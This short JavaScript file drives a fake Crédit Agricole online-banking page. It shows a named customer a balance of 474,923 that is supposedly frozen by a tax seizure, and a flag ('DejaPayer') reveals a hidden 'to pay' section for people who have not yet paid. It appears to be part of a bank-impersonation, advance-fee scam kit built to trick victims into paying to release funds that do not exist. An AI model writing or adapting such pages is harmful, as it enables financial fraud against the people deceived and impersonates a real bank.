var message =
  "L'opération est impossible, car ce compte est temporairement restreint pour des raisons de sécurité ou de conformité. Consultez les notifications ou contactez l'assistance pour plus d’informations. Vos opérations bancaires sont temporairement bloquées COMPTE BLOQUÉ À la suite d’une Saisie Administrative à Tiers Détenteur (SATD), le Crédit Agricole est tenu de bloquer l’ensemble des opérations bancaires ainsi que les fonds disponibles sur votre compte jusqu’à la régularisation de votre dette fiscale.";
var name = "Angelina Toti";
var solde = "474 923,00";
var epargne = "0";

// Si il as deja payer !
var DejaPayer = true;

if (!DejaPayer) {
  document.getElementById("aPayer").classList.remove("hidden");
}

// add solde and epargne to local storage
localStorage.setItem("solde", solde);
localStorage.setItem("epargne", epargne);

document.getElementById("messageId").innerText = message;
document.getElementById("clientName").innerText = name;
document.getElementById("soldeClient").innerText = solde;
document.getElementById("epargneId").innerText = epargne;